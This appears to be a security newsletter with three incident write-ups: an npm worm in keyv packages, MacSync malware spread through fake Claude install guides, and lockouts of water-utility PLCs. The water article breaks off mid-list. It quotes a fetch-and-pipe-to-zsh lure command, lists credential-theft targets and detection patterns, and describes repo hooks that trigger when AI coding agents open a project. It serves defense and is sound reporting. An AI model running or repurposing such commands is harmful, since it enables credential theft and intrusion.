articles.title: Six Minutes to Detection, and It Still Wasn't Fast Enough: Inside the keyv Worm That Weaponized npm's Own Trust Machinery
articles.subtitle: On August 4, 2026, a single compromised maintainer account turned some of the most foundational packages on npm into a self-propagating credential stealer. The poisoned releases carried valid provenance. The exfiltration had no C2 to block. And the incident-response playbook itself was booby-trapped. A reconstruction from five independent research teams.
articles.tags: npm, Supply Chain, Malware, Shai-Hulud, DevSecOps, CI/CD, Open Source

These are packages most developers never install directly; they sit deep inside the dependency trees of tools like ESLint [1][2].

The kit: one line, one runtime, one 728 KB stealer
Lineage: the third season of the npm worm
What to do — in the right order

articles.bodyHtml:
Summary

  • On August 4, 2026, attackers compromised the GitHub account of the maintainer behind keyv — a key-value storage library with roughly 127 million weekly npm downloads — and pushed a credential-stealing worm across the maintainer's entire package family, including flat-cache (~565M downloads/month) and file-entry-cache (~557M/month). These are packages most developers never install directly; they sit deep inside the dependency trees of tools like ESLint [1][2].
  • The poisoned releases shipped with valid OIDC/SLSA provenance signed by GitHub Actions, because the attackers released through the project's own, legitimate build pipeline. The attestation was truthful about the build. It said nothing about the source [1][4][5].
  • The payload — a variant of the "Mini" Shai-Hulud self-propagating malware family — runs on npm install via a one-line preinstall hook, downloads the Bun runtime, and sweeps npm, GitHub, AWS/GCP/Azure, Vault, Kubernetes, SSH and CI credentials. It then uses stolen tokens to republish poisoned versions of every package the victim maintains — minting fresh, valid sigstore provenance for each one [2][3][4].
  • Exfiltration needs no attacker infrastructure: stolen secrets land encrypted in public GitHub repos created under victim identities, all titled "Shai-Hulud: Here We Go Again" — over 1,300 of them existed by end of day [2][3][5].
  • Two traps compound the damage: a dead-man's switch that executes an attacker-supplied command the moment you revoke the stolen GitHub token — punishing the textbook first response — and IDE hooks planted in the source repo (.claude/settings.json, .vscode/tasks.json) that fire when a developer or an AI coding agent merely opens the project [4][7].
  • Scale counts moved all day: SafeDep enumerated 1,684 poisoned versions across 420 package names; Aikido reported 868+ packages across 1,381 versions with over 2 billion combined monthly installs. Nine organizations were hit within roughly 30 minutes. All totals are artifact counts, not victim counts — and all are lower bounds [1][3][5].
  • npm began restoring clean latest tags within hours. The recovery instruction that matters most: audit lockfiles for exact versions, remove the token watcher first, then rotate everything.

What happened, hour by hour

(All times UTC, August 4, 2026, from npm registry timestamps and vendor telemetry [3][4][5][7].)

The short version. At 09:00 the attacker, identity already compromised, planted autostart hooks for Claude Code and VS Code into the keyv source repository. Between 09:30 and 09:32, the scoped @keyv/ packages pushed their 6.0.0 tarballs. At 09:35, keyv@6.0.0 went live — the first release carrying the malicious preinstall hook, and it passed through the project's own release workflow, so its GitHub Actions provenance checked out perfectly. Socket's scanner flagged it about six minutes later — an excellent detection time that still came after the exposure window had opened [3][7]. At 09:38 the worm published @thiennq/docs-viewer@1.6.2, its first victim outside the keyv/cacheable families, and at 09:39 the repository showed the attacker tidying up: force-pushes to main, the v6.0.0 tag deleted and recreated, a commit literally titled "add setup.mjs and Math_Symbol.js to all @keyv/ packages" [3]. At 10:09, the burst swept the entire cacheable family. From there the worm moved organization to organization every two to seven minutes, republishing each victim's whole namespace at roughly one package per second, reaching nine unrelated organizations in about half an hour — including namespaces belonging to @ornikar, @deliveroo, @onereach, @or-sdk, @arv-bedrock, @servicetitan and @qlik [5]. By early afternoon the trackers were reconciling hundreds of poisoned packages and well over a thousand malicious versions. By 17:40 IST, npm had rolled the latest tag on at least nine package names back to clean releases [7]. The investigation is still open as this goes to press.

Why keyv was the perfect host

The attacker did not pick a famous target. They picked a load-bearing one. keyv is a key-value storage abstraction with adapters for Redis, SQLite, Postgres, MongoDB and more; the same maintainer's ecosystem — cacheable, cacheable-request, flat-cache, file-entry-cache, cache-manager — are the caching utilities underneath half the JavaScript toolchain. A canonical dependency chain runs eslint → file-entry-cache → flat-cache → keyv, which means the overwhelming majority of affected installs are transitive: nobody typed npm install keyv, and that is precisely why the blast radius measures in billions of monthly downloads rather than thousands of direct users [1][3].

The worm's choice of second-stage victims was equally deliberate. Among the poisoned packages were authentication libraries (@or-sdk/auth, @or-sdk/api-tokens, @or-sdk/permissions, @arv-bedrock/auth) — a credential-reading payload inside the packages that exist to handle credentials compounds downstream exposure beyond anything a config library would cause. And the @ornikar leg is almost entirely ESLint, Babel, Jest and Prettier configs: code that lands on CI runners and developer laptops as a dev dependency, exactly the environments richest in tokens [5].

The kit: one line, one runtime, one 728 KB stealer

The entire infection mechanism is a single added line in package.json — "preinstall": "node setup.mjs" — so the payload executes on a bare npm install, before any of the victim's own code runs [1][5]. setup.mjs is a heavily obfuscated dropper with exactly one job: silently download the Bun JavaScript runtime from Bun's official GitHub releases (bun-v1.3.13; the Bun/1.3.13 user-agent is a usable IOC) and use it to execute the real payload, Math_Symbol.js (some samples carry a sibling file, Math_Init.js) — a ~728 KB obfuscated bundle that contains the credential collectors, the encryption and exfiltration routines, and the propagation logic [2][3][4][6].

The collectors read like an inventory of everything a developer machine knows: npm tokens from .npmrc and the registry's whoami endpoint; GitHub CLI tokens (classic PATs, session and OIDC tokens); AWS keys from ~/.aws/credentials, the instance metadata service, and Secrets Manager across regions; GCP service-account keys and Azure client secrets as file and regex targets; HashiCorp Vault tokens from environment variables and standard file paths; Kubernetes service-account tokens; GitHub Actions secrets — enumerated via API, with values recovered from environment, files and process memory on the runner; database connection strings, private key blocks, Stripe keys, crypto wallets, AI-tool configuration files, plus a TruffleHog-style regex sweep of the disk [2][4][5].

The propagation is what makes it a worm. With a stolen npm identity it queries the registry for every package that identity maintains, downloads each tarball, injects the hook and payload files, recomputes the integrity fields, bumps the version, and PUTs the result back to the registry — riding npm's OIDC trusted-publishing token exchange. Most remarkably, Socket confirmed the bundle carries its own provenance stack: it builds DSSE attestation envelopes, requests Fulcio signing certificates, and submits Rekor transparency-log entries. Republished versions therefore don't merely inherit stale trust metadata — they arrive with freshly minted, verifiable sigstore provenance [3].

The exfiltration has no command-and-control host to block, sinkhole, or reputation-score. A GitHubSender component creates repositories under the compromised identity and commits the encrypted loot via GraphQL; every one of these dead drops carries the description "Shai-Hulud: Here We Go Again" — roughly 1,300 existed by evening, 546 of them created that single day. The payloads are wrapped in RSA-4096 envelope encryption against operator-held keys, so the repos themselves are ciphertext. There is no attacker domain anywhere in the blob; SafeDep's "re-verification found no plaintext C2" is the sentence that should end the era of domain-reputation defense for this class [2][3][5].

The two traps

Trap one is rigged to incident response itself. The payload writes the stolen GitHub token and a handler command to ~/.config/gh-token-monitor/, persists as a macOS LaunchAgent or a linger-enabled systemd user service, and runs a watcher that polls GitHub with the stolen token every 60 seconds. When the token stops working — an HTTP 4xx, which is to say the moment you revoke or rotate it — the watcher evaluates a remote-supplied handler string, then deletes its state and exits. The attacker booby-trapped the first page of every IR playbook: rotate first, and you execute their code. The correct order is: find and remove the watcher, then rotate [3][7].

Trap two is rigged to your tools. Hours before the first poisoned release, the same compromised identity planted autostart hooks inside the keyv source repository: a SessionStart hook in .claude/settings.json and a folderOpen task in .vscode/tasks.json. Both execute the loader when someone — a developer, or an AI coding agent given the repository — merely opens the project and trusts the workspace. No npm install required. The commit carried a green GitHub-verified badge and named github-actions[bot] as its author. If you needed a single artifact proving that agentic coding tools are now part of the attack surface, this is it [5][7].

The provenance paradox

This incident will be remembered as the day an entire category of supply-chain assurance failed publicly, and it is worth being precise about how it failed, because the failure is conceptual, not implementational. keyv@6.0.0 carried valid OIDC and SLSA provenance — it genuinely was built by the project's real GitHub Actions workflow, from the real repository, and the attestation correctly identified that build process. What provenance cannot attest is whether the source entering the build was safe. The verified badge on the commit marked a real github-actions[bot] signature — verifying that an action ran, not that the identity commanding it was honest. Or as SafeDep put it: the same payload appeared under direct npm publishing accounts elsewhere in the campaign, and automated, token-driven propagation best fits the timing — the trust machinery worked exactly as specified, and faithfully certified the poison [5][7].

There is a darker footnote, courtesy of Wiz: the attacker's initial commits carried the string "IfYouBlockThisAPIKeyItWillCrashTheLiveProductionServersOfAllThirdPartyClients" — an intimidation message aimed at whoever would find it. Combined with the dead-man's switch, the campaign's design philosophy is consistent: make defense itself expensive [4].

Lineage: the third season of the npm worm

Wiz classifies the payload as a descendant of the "Mini" Shai-Hulud family — the name a Dune reference that stuck after the original Shai-Hulud became npm's first self-propagating worm in September 2025 — and notes similarities with the TeamPCP and "antv" supply-chain campaigns; the exfil-repo description matches code that was previously open-sourced, which muddies attribution further [4]. April 2026 already brought a CanisterWorm-style copycat wave (including a poisoned PyPI package, xinference), and by June, Barracuda was writing that self-propagating supply-chain malware had become "a structural shift rather than just a new variant" [9][10][11]. August 4 is the proof. Three seasons in a year: worms on npm are no longer an anomaly; they are a genre with its own conventions — install-time execution, credential theft, token-driven republishing, and increasingly, provenance forgery and IR countermeasures.

Microsoft Threat Intelligence, tracking the campaign on X, stated that the same pattern appeared across all affected packages and that the evidence suggests a single actor using multiple stolen tokens — a useful working hypothesis, though SafeDep's more careful framing stands: the burst cannot by itself establish how many accounts were compromised, and the initiating propagation function was not fully recovered [5][6].

What to do — in the right order

For the rest of today:

  1. Do not rotate anything yet if a listed version may have installed on a machine you own. First check for and remove the watcher: ~/.config/gh-token-monitor/, ~/.local/bin/gh-token-monitor.sh, the LaunchAgent com.user.gh-token-monitor, or the equivalent systemd user service [3][7].
  2. Audit lockfiles for exact resolved versions — not latest, not tags, which npm has been rolling back all day, and not a cached blocklist; the full package list is incomplete and moving. The malicious artifacts named so far include keyv@6.0.0, flat-cache@6.1.24, file-entry-cache@11.1.6, cacheable-request@13.0.20, cacheable@2.5.1, @cacheable/utils@2.5.1, @cacheable/net@2.1.1, @cacheable/node-cache@3.1.2, @cacheable/memory@2.2.1, cache-manager@7.2.10, plus packages across the nine hit organizations [3][5][6].
  3. Hold fresh installs where possible, and set --ignore-scripts on any install you cannot avoid. (npm 12 blocks unapproved lifecycle scripts by default — older clients do not [7].)
  4. Then rotate, broadly, on any machine that resolved an affected version during the window: npm tokens, GitHub credentials, cloud keys (AWS/GCP/Azure), Vault, Kubernetes, SSH/private keys. Socket's guidance is blunt — treat any workstation or runner that executed an affected version as credential-exposed — and any npm token used in CI during the window should be considered compromised even if the package list is still provisional [3][5].
  5. Treat CI pipelines that ran today as exposure events, not just build logs.

Socket and SafeDep are maintaining live campaign pages with the moving package list [3][8].

Caveats and open questions

  • All numbers are artifact counts, not victim counts. SafeDep verified 353 poisoned versions across 79 names directly against the registry while its wider monitoring showed more; Aikido's 868/1,381 figure and SafeDep's 1,684/420 enumeration could not both be independently reproduced at the reporting cutoff, and neither shows how many machines actually executed the payload [5][7].
  • The initial account compromise vector is unknown — how the maintainer's GitHub account fell has not been established publicly, and there is no basis for blaming the maintainer.
  • Attribution is a hypothesis. "Single actor, multiple tokens" (Microsoft) and "automated propagation fits best" (SafeDep) are compatible assessments, not findings [5][6].
  • The dead-man's switch handler content is unknown — the watcher evaluates a remote-supplied string only upon revocation, so its payload had not fired for researchers to observe at publication time [3].
  • Counts, package lists, and npm's tag remediation are still moving; this article reflects public reporting up to approximately 15:00 UTC on August 4, 2026. We will update as vendors publish new findings.

The takeaway

Every entry in this series has tracked trust migrating into places we stopped inspecting — a hallucinated URL, a helpful document, a friendly voice, an official-looking guide. Today the migration reached the layer nobody votes on: the transitive plumbing of the toolchain itself. You never chose keyv. Your linter chose it for you, transitively, three layers down — and when its single maintainer account fell, the attestation system designed to make open source safer certified the malware with a straight face.

Provenance proves the path an artifact took. It says nothing about the payload it carries. Until our trust signals learn the difference, the rule is the same one this series keeps landing on: your machine is the last perimeter — so treat install time like execution time, because that's what it is.

*If this analysis was useful, subscribe to The Human Firewall on Substack — one scam, dissected daily, with sources. All resources, threads and checklists in one place: https://linktr.ee/HumanFirewall*

articles.title: The Install Guide That Wasn't: MacSync and the Fake Claude Tutorial on the Real claude.ai
articles.subtitle: No exploit, no CVE, no phishing email. The operators bought the slot above Anthropic's own search result, dressed a public chat share up as an Apple Support guide, and let victims run the malware themselves. It ended with their own wallet apps asking for the seed phrase. Here is what researchers pulled from the attackers' servers.
articles.tags: macOS, Malware, MacSync, ClickFix, Malvertising, Cryptocurrency, AI Trust
articles.summary: - In mid-July 2026, a Mac user searched Google for how to install Claude on a Mac, clicked the sponsored top result, and landed on a page hosted on the real claude.ai domain — a publicly shared chat styled to look like an Apple Support install guide. Following its instructions, they pasted a single command into Terminal and infected themselves with MacSync, a six-stage macOS stealer and RAT [1].

toc.title: Infrastructure and attribution — what is honestly known
What Anthropic did — and didn't — do
Defense — for individuals and for teams

articles.bodyHtml:
Summary

  • In mid-July 2026, a Mac user searched Google for how to install Claude on a Mac, clicked the sponsored top result, and landed on a page hosted on the real claude.ai domain — a publicly shared chat styled to look like an Apple Support install guide. Following its instructions, they pasted a single command into Terminal and infected themselves with MacSync, a six-stage macOS stealer and RAT [1].
  • There was no exploit at any point in the chain. Every step ran on borrowed trust: Google's ad system supplied the placement, Anthropic's domain supplied the credibility, Apple's own icons dressed the phishing dialogs, and the victim's own hands executed the payload [1][4].
  • Huntress recovered the full kit from the attacker's delivery servers. Six stages: a polymorphic zsh loader, a background daemon, a server-side AppleScript stealer that phishes Full Disk Access and the account password, a native C++ RAT with LaunchAgent persistence, a helper app literally named "Screen Recording" — and finally a module that rewrites Ledger Live, Ledger Wallet or Trezor Suite in place to phish the 24-word recovery phrase [1].
  • This is not one campaign. Moonlock Lab documented a first fake-Claude-guide wave in February (15,600+ views on the malicious artifact). TrendAI tracked a six-wave operation from April to June that pivoted from GitLab Pages to claude.ai shares. Zscaler observed 22 malicious Google Ads campaign IDs in a single week of June. Deriv AI reported a parallel July campaign with different infrastructure [2][3][4][5][6].
  • Anthropic banned the responsible accounts and disabled the malicious shared conversations after researcher reports; Claude itself was never compromised — the attackers abused a legitimate public-sharing feature [3][4][7].
  • MacSync is commodity malware-as-a-service. The playbook it runs — poisoned search results plus a pasted command — works for any brand and any operator. The defense is no longer "check the domain." The defense is: never execute what you cannot read.

What happened

The victim's browser history, as reconstructed by Huntress, is three rows long: a Google search for how to install Claude Code on a Mac, a paid ad, and a page that appeared to hold the answer. The ad was the entire trick. The result the victim clicked was not the organic anthropic.com listing but a Google Ads placement ranked above it — placement the operator simply purchased. The click's paperwork was still in the URL: an aclk redirect hop and a gclid token tying the visit to Google Ads campaign ID 23991223358. An organic click leaves none of that [1].

The destination was not a lookalike phishing domain. It was claude.ai/share/... — Anthropic's own feature that lets any user publish a conversation to a public URL. The operator had titled the conversation like documentation ("Running Claude Code on Mac"), set their display name to "Apple Support", and let the platform do the rest: the share page renders with a badge reading "Shared by Apple Support," and Anthropic's own safety banner above the content repeats the attacker's chosen name back to the reader — "This is a copy of a chat between Claude and Apple Support." The guide promised the install "leaves your personal files untouched" and "makes no system-level modifications without your approval" [1].

Step 1: open Terminal. Step 2: paste this command and press Return. The victim who did that lost their browser sessions, keychain, account password, SSH and cloud keys, Telegram session — and, if they owned a hardware wallet, eventually their seed. Huntress investigated the intrusion in mid-July; because the victim took the host offline before the malware could be pulled from disk, the researchers went to the source instead and recovered every stage from the operator's own delivery servers — and then caught the same chain a second time on another host, served from a second domain, which let them separate what is per-victim from what is fixed [1].

That was one victim and one campaign. Reporting around it describes a conveyor belt:

  • February 2026: Moonlock Lab documents a ClickFix wave using a public Claude artifact titled "macOS Secure Command Execution" — viewed 15,600+ times (AdGuard counted 12,300 days earlier) — plus a Medium article impersonating Apple Support. The ads ran through compromised Google Ads accounts, including those of a Canadian children's charity and a Colombian retailer [5][8][9].
  • April 8 – June 14, 2026: TrendAI tracks a six-wave malvertising operation impersonating at least six AI brands (ChatGPT Codex, Perplexity, Cursor IDE, JetBrains, Claude AI) across 106 malicious hostnames, starting on trusted *.gitlab.io hosting before pivoting in May to abusing claude.ai shared chats. After TrendAI's report, Anthropic banned accounts, disabled the shares and announced additional abuse mitigations [3][7].
  • May 2026: Beelzebub Labs reverses a fake "Claude Code" campaign in which a Google ad led to a Google Sites page with a fabricated "12M+ downloads" counter and a MacSync build literally tagged claude1 [10].
  • June 12–19, 2026: Zscaler Threat Hunting observes the shared-Claude-chat tactic at scale: 22 unique Google Ads campaign IDs, seven search terms (including a Chinese-language variant), delivery domains camouflaged as ordinary US small businesses (laminate flooring, pet sitters). Zscaler notified Anthropic; the chats went offline [2][4].
  • July 28, 2026: Deriv AI documents a parallel July operation (Google Ads campaign 23936394455 — a different buy than Huntress's), multiple claude.ai/share URLs for redundancy, delivery domain hybridcustomhomes[.]com with sibling domains registered as a garage-door installer and a pediatric practice, and a CrowdStrike correlation confirming known MacSync payload hashes behind Cloudflare-fronted IPs [6][11].
  • July 29, 2026: Huntress publishes the full reverse engineering of the six-stage kit [1]; coverage follows through July 30 – August 1 [12][13].

Different campaign IDs, different domains, different researchers — same playbook, same malware family. That is what "malware-as-a-service" looks like in practice.

The anatomy of the lure

Three properties make this lure class unusually effective, and all three are design choices rather than technical feats.

The ad is above the vendor. A sponsored slot sits atop every organic result, including anthropic.com's own. There is no exploit for Google to reject and nothing malicious in the click path — just a legitimate ad, on a legitimate network, bought with presumably stolen or compromised ad accounts, pointing at a page on a domain the victim already trusts [1][9].

The page is real. A claude.ai/share page is served from Anthropic's infrastructure, over valid HTTPS, under a brand the victim just searched for. Nothing in standard user training — check the domain, look for the padlock — fires. The malicious part is the content of a user-generated page, and the platform's own UI (the "Shared by" badge, the safety banner) amplifies the attacker's chosen display name instead of flagging it [1][4]. The same design decision made headlines for the opposite reason this summer, when private Claude conversations surfaced in Google and Bing — share links are ordinary public, indexable web pages [14].

The command defeats inspection. The instruction follows the ClickFix pattern that migrated from Windows to macOS:

curl -kfsSL $(echo 'aHR0cDovL2FnZW50aWNzb3JhLmNvbS9jdXJsL...'|base64 -D)|zsh

The destination URL exists only inside the Base64 blob, so a careful skim sees an echo and a decode — no domain, no obvious payload. curl -kfsSL fetches it silently with certificate validation disabled, and the trailing | zsh executes whatever comes back in memory, without a file ever touching disk. No Gatekeeper dialog, no download to inspect, nothing for a scanner to hash. Decoded, the endpoint was hxxp://agenticsora[.]com/curl/<token> — a domain named to sound like an AI product ("agentic" + "Sora"), the kind of name that draws no scrutiny beside an AI install guide [1]. Zscaler observed the identical command shape across their June wave [2].

The six stages of MacSync

Huntress's central finding: MacSync is not a smash-and-grab stealer but a six-stage kill chain, each stage setting up the next, with the valuable logic kept server-side where it can be changed at will [1].

The chain in prose:

Stages 1–2 — loader and daemon. The pasted command returns a 1,442-byte zsh wrapper around a gzip+Base64 heredoc; the wrapper is polymorphic per build (fresh variable names, fresh delimiters, a unique outer hash every time), which is why file-hash detections are near-useless. Inflated and run via eval, it becomes a backgrounded daemon_function with three jobs: fetch /dynamic?txd=<token> and pipe the response to osascript; upload /tmp/osalogging.zip to /gate in 10 MiB chunks if it exists; delete the archive on success. It detaches fully — three redirects to /dev/null — so the Terminal session shows the victim nothing at all [1].

Stage 3 — the server-side stealer. The /dynamic response is a ~46 KB AppleScript served by the C2 behind a hardcoded api-key — it never exists on disk. Its entry point is a permission heist: it probes ~/Library/Cookies/ to test for Full Disk Access, and if that fails it shows a "Full Disk Access required!" dialog wearing Apple's own FileVault padlock icon, opens exactly the right System Settings pane, writes its own re-pull line into ~/.zshrc (so the next Terminal launch re-runs everything with the permission granted), restores the file afterwards and force-quits Terminal. Then it phishes the account password in a fake "System Preferences" dialog that validates each attempt against the real directory service (dscl authonly) and loops until the password is correct — the operator walks away with confirmed plaintext. A 3,434-byte helper (/tmp/.kgrab.sh) lifts every Chromium "Safe Storage" AES key out of the login keychain. The sweep: 13 Chromium browsers plus Firefox/Zen/LibreWolf/Waterfox, cookies, logins, extension storage for a list of 40 general and 89 wallet extension IDs, ~21 desktop wallet apps, Telegram's full tdata/ session, all keychain databases, ~/.ssh, ~/.aws, ~/.kube, Apple Notes' database, shell dotfiles, and a file-grabber sweeping Desktop/Documents/Downloads for extensions like seed, kdbx, pem, wallet. Everything is archived with Apple's own ditto to /tmp/osalogging.zip, staged under /tmp/sync<random>/, guarded by a mutex directory at /tmp/macsync_<token>.lock — the artifact the family is named after. The script's self-identifying beacon reads: MacSync Stealer, Version 1.1.2_release [1].

Stage 4 — the RAT. Stage 3 downloads a universal Mach-O (x86_64 + arm64, plain C++, statically linked with its own OpenSSL and Brotli) to ~/.local/com.apple.<8hex>.hcpi and persists it via a LaunchAgent with RunAtLoad and KeepAlive. The agent's disguise is adaptive: it checks which real updater plists exist on the host (Google Keystone, Adobe, Microsoft AutoUpdate, Dropbox, Spotify, Grammarly, JetBrains) and borrows the first available label — so detection keyed on com.apple.* alone will miss it. Its live control channel is TLS over a raw IP, 85.206.161[.]241:8443, speaking WebSocket with AES-256-CBC-wrapped JSON; it offers an interactive shell, chunked file transfer, screen capture (delegated to stage 5), and it reads the phished password from ~/.local/.mpwd [1].

Stage 5 — the permission farmer. An 84 KB Objective-C app whose bundle display name is literally "Screen Recording", so when macOS raises the TCC prompt it reads "'Screen Recording' would like to record this computer's screen" — a request that looks like the system talking to itself. It runs invisibly (LSUIElement, no Dock icon), and performs the capture by shelling out to Apple's own signed /usr/sbin/screencapture -x rather than calling capture APIs [1].

Stage 6 — the wallet rewrite. If /Applications contains Ledger Live, Ledger Wallet or Trezor Suite, the victim's own app is trojanized in place: the bundle is copied out and back, the malicious app.asar and Info.plist are swapped in, and the whole app is ad-hoc re-signed so it launches normally. Five seconds after the victim next opens what they believe is their wallet manager, the window silently navigates to a phishing page wearing the wallet's branding: a fake update error, a mock of the physical-device recovery UI, and finally a 24-field "Enter your recovery phrase" form — exfiltrated to main.sdhomeinspectors[.]com/modules/wallets or main.southcarolinacounselor[.]com/modules/wallets, after which the page drops the victim back into the real app whether the theft succeeded or not. The Ledger pair is one payload rebadged (26 of 30 unpacked files byte-identical), marked with the author's Russian comment "ВСТАВЬТЕ СЮДА" — "INSERT HERE." The Trezor build required a CSP allowlist patch to let the exfil through. Possession of a seed phrase is possession of every wallet it derives — permanently, with no reset and no device required [1].

Infrastructure and attribution — what is honestly known

The operation ran on three tiers plus two seed-drop domains: Cloudflare-fronted delivery (agenticsora[.]com, malwareaudit[.]com), an operator panel IP recorded in the stealer beacon (103.216.221[.]95), a raw-IP TLS channel for hands-on RAT control (85.206.161[.]241:8443), and the two seed-drop domains — innocuous small-business names that had prior lives as a parking page and a marketplace listing before being re-registered on February 13, 2026, roughly five months before the Huntress intrusion. All four domains share one privacy-redacted WHOIS fingerprint, consistent with a single operator behind this particular assembly [1].

On attribution, the honest position is narrow. The kit's AppleScript stealer stage closely mirrors the AMOS/Atomic Stealer playbook — osascript body, dscl authonly password validation, Safe Storage key theft, the same collection lists, even poisoned-search delivery. The source is commented in Russian throughout, including working notes ("Removed the fragile SafeSQLiteCopy — it often crashed when Firefox was running") that show active maintenance. Huntress's own framing is precise: this is a family resemblance, not a named-actor attribution [1]. Zscaler's analysts likewise note Russian-language comments and observe that the operators previously distributed malware via fake "cracked" software before pivoting to ClickFix and AI-platform abuse [2][4]. MacSync circulates as low-cost malware-as-a-service, and the public record shows multiple distinct ad campaigns and api-keys — so multiple operators may be renting the same kit. Treat any stronger claim with suspicion.

What Anthropic did — and didn't — do

Two things are true at once, and honesty requires both. First: Claude was never compromised. No Anthropic system was breached; the attackers abused the public chat-share feature exactly as designed, plus Google's ad network exactly as designed. Anthropic's safety banner even sat visibly above the fake guide — it just lacked any mechanism to judge the content. Second: the response worked as the openness is abused. After TrendAI's and Zscaler's reports, Anthropic investigated, banned the responsible accounts, disabled the malicious conversations, and announced additional abuse mitigations for the share feature [3][4][7]. The structural problem persists anyway: a share link is a public, indexable page under a trusted certificate, and as the separate summer story about private Claude chats surfacing in search results showed, whatever lands on a share URL is crawlable by design [14]. Any platform with a "publish conversation" button now has this abuse case. Anthropic is simply the brand whose users currently Google install instructions in numbers worth buying ads against.

Defense — for individuals and for teams

Personal rules (the ones that actually stop this):

  1. Install developer tools only from pages reached by typing the vendor's domain yourself — never via ads, and never via "shared" content on the vendor's domain.
  2. Treat a correct domain as neutral information. Domain trust covers the host, not user-generated content on it.
  3. Never run a command whose effect you cannot read. Any instruction that hides its destination inside Base64 is disqualifying by itself.
  4. A password dialog that loops until you type the correct password is malware. Real system dialogs do not validate-and-repeat.
  5. If you ran it anyway: isolate the Mac, and from a different, clean device rotate every stored password, revoke browser and developer sessions, rotate SSH/cloud keys, move crypto to a brand-new wallet with a fresh seed, then reinstall macOS. If a hardware-wallet app asked for your seed phrase on-screen: that phrase — and every account derived from it — is gone. Move everything; the old seed can never be trusted again [1][11].

For defenders (anchor on behavior, not hashes — the loader re-randomizes every build): curl -k piped into zsh with a Base64 decode; curl .../dynamic | osascript; a ~/.zshrc re-pull line appearing and vanishing; a com.apple.<8hex>.hcpi binary beside a .mpwd file in ~/.local; a LaunchAgent whose ProgramArguments point there regardless of its borrowed vendor label; /usr/sbin/screencapture -x invoked by any non-Apple parent; ad-hoc signatures (codesign -f -s -, no Team ID) on apps that should carry a vendor signature — above all wallet managers with mismatched ElectronAsarIntegrity hashes and injected recovery-step-* files; outbound POSTs with a seedwords JSON body to a /modules/wallets path [1]. Huntress's full network and host IOC list (domains, IPs, hashes, MITRE mapping) is in the source report [1].

Caveats and open questions

  • Huntress's six-stage reconstruction comes from one investigated intrusion plus one second host, enriched by direct pulls from the operator's servers. The wallet-trojan stage's real-world success rate is unquantified — no victim-loss figures exist for the July campaign.
  • The February, June and July campaigns overlap in malware and TTPs but show different ad campaigns, domains and api-keys; whether they are one operator iterating or several customers of one MaaS kit is unproven either way. Deriv AI's CrowdStrike correlation is reported secondhand [6][11].
  • The AMOS/Atomic lineage is a code-and-tradecraft resemblance; no outlet has named an actor, and the Russian-language comments indicate at most Russian-speaking developers [1][2].
  • The "15,600 views" figure from February is a view counter, not an infection count — its conversion rate is unknown [5][8].
  • Beelzebub Labs named its May build claude1 (v1.1.2), matching Huntress's July version string 1.1.2_release; the Google Sites vs. claude.ai-share delivery difference across those analyses likely reflects the campaign's constant delivery rotation rather than genuinely separate malware [1][10].

The takeaway

Every entry in this series has been about trust migrating somewhere it shouldn't. The first was about AI sending you to addresses that didn't exist. MacSync is the inverse, and it is worse: no hallucination required. The address was real, the certificate was valid, the brand was correct, the platform's own banner vouched for the fake name. The attackers didn't break a single system — they rented Google's top slot, Anthropic's domain reputation, Apple's icon set, and finally your own wallet's window, and let you do the rest.

The defense shifted the moment domain checks stopped meaning anything. The new line is behavioral: you are the sandbox now. If you can't read it, don't run it — no matter whose logo is on the page.

articles.title: America's Water Lockout: How Default Passwords Put 30+ Towns Into Manual Mode
articles.subtitle: Since July 27, intruders have been walking through the front door of US water utilities — internet-facing control devices with factory passwords — and locking the operators out. A reconstruction of the week's biggest infrastructure attack, and the fix that costs almost nothing.
articles.summary: Since July 27, 2026, water and wastewater utilities in at least seven US states have reported cyber intrusions to the FBI. In the heaviest wave, on the night of July 26–27, more than 30 community drinking-water systems in Minnesota were hit in what state officials call a coordinated attack [1][2]. The intruders' method was almost insultingly simple: they logged into internet-facing industrial controllers — notably Allen-Bradley MicroLogix 1100/1400 programmable logic controllers — changed IP settings and passwords, and locked the operators out of their own plants [1][3].

toc.title: What is confirmed — and what is not
Anatomy of the attack: the open door, not the battering ram
Minnesota: what a good response looks like at 6 AM
Why water is the softest target in critical infrastructure

articles.bodyHtml:
Summary

Since July 27, 2026, water and wastewater utilities in at least seven US states have reported cyber intrusions to the FBI. In the heaviest wave, on the night of July 26–27, more than 30 community drinking-water systems in Minnesota were hit in what state officials call a coordinated attack [1][2]. The intruders' method was almost insultingly simple: they logged into internet-facing industrial controllers — notably Allen-Bradley MicroLogix 1100/1400 programmable logic controllers — changed IP settings and passwords, and locked the operators out of their own plants [1][3].

The consequences were physical, not digital: lost water pressure, flooding, precautionary boil-water notices, and utilities forced into manual operation [1][4]. A leaked state memo says the attackers' "likely desired impact" was loss of system pressure followed by potential contamination of the water supply [4]. No contamination has been confirmed; no ransom has been demanded — a combination that points away from crime and towards state tradecraft. Preliminary assessments from US investigators, and pattern analysis by Tenable, point at Iran-linked actors, consistent with the IRGC-affiliated group CyberAv3ngers — though officials stress the attribution is not final [5][6][7].

This article reconstructs what is actually known, separates fact from attribution, and lays out the unglamorous defense that would have stopped all of it.

What is confirmed — and what is not

Precision matters here, because this story invites panic it has not earned. Confirmed [1][2][3][4]:

  • Water utilities in at least seven states reported intrusions since July 27; "some of that activity degraded water operations" (FBI/EPA joint advisory of July 30).
  • Minnesota sustained the coordinated blow: 30+ municipal water systems (Minnesota's CISO John Israel put the number at 36) between July 26–27, with Plymouth, South St. Paul, Maple Plain and Braham publicly confirming.
  • Attackers changed device passwords and network/IP parameters, cutting "monitoring and control functionality." At least one utility found its control logic altered across several sites.
  • Effects included pressure loss, flooding, boil-water notices and sustained manual operation.

Not confirmed (and worth repeating loudly): any contamination of drinking water, any ransom demand, and — formally — any attribution. The state of drinking water, per the Minnesota Department of Health: no municipality has been asked to change water usage [2][8].

Anatomy of the attack: the open door, not the battering ram

The devices under siege are programmable logic controllers (PLCs) — lunchbox-sized industrial computers that translate software commands into physics: open the valve, start the pump, dose the chlorine, watch the pressure [1][3]. The attacked models were Rockwell Automation's Allen-Bradley MicroLogix 1100/1400 series, though federal officials warned that other brands face the same exposure [1].

The intrusion chain had no CVE and no malware at its heart [1][9]:

  1. Find. Scan the public internet for exposed PLCs — an exercise measured in minutes with the usual search engines.
  2. Walk in. Authenticate with default or weak credentials.
  3. Change the locks. New passwords, reconfigured network parameters. The legitimate operator is now outside; the intruder is inside, alone with the physics.
  4. Optional tampering. Modify control programs — as at least one utility discovered only after noticing logic discrepancies across multiple sites.

